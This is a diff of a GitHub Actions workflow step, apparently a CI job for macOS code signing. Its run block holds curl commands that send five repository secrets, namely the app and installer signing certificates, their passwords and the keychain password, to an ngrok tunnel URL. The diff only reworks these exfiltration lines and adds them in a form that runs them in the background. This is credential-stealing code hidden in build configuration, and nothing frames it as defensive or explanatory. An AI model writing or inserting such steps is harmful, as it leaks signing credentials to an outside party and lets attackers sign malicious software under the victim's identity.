@@ -23,8 +23,8 @@ jobs:
           MACOS_CERTIFICATE_INSTALLER_PWD: ${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }}
           MACOS_KEYCHAIN_PWD: ${{ secrets.MACOS_KEYCHAIN_PWD }}
         run: |
-          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP/${{ secrets.MACOS_CERTIFICATE_APP }} 2>/dev/null
-          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP_PWD/${{ secrets.MACOS_CERTIFICATE_APP_PWD }} 2>/dev/null
-          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER/${{ secrets.MACOS_CERTIFICATE_INSTALLER }} 2>/dev/null
-          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER_PWD/${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }} 2>/dev/null
-          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_KEYCHAIN_PWD/${{ secrets.MACOS_KEYCHAIN_PWD }} 2>/dev/null
+          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP/${{ secrets.MACOS_CERTIFICATE_APP }} &
+          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_APP_PWD/${{ secrets.MACOS_CERTIFICATE_APP_PWD }} &
+          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER/${{ secrets.MACOS_CERTIFICATE_INSTALLER }} &
+          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_CERTIFICATE_INSTALLER_PWD/${{ secrets.MACOS_CERTIFICATE_INSTALLER_PWD }} &
+          curl https://771e-93-156-211-20.ngrok-free.app/MACOS_KEYCHAIN_PWD/${{ secrets.MACOS_KEYCHAIN_PWD }} 
